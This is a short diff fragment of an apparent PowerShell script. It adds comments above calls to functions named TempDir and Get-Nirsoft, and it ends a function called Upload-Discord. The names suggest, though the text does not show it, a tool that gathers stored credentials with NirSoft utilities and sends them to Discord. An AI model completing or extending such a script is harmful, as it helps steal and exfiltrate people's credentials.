@@ -46,5 +46,8 @@ function Upload-Discord {
     }
 }
 
+#Call TempDir
 TempDir
+
+#Call Get-Nirsoft
 Get-Nirsoft
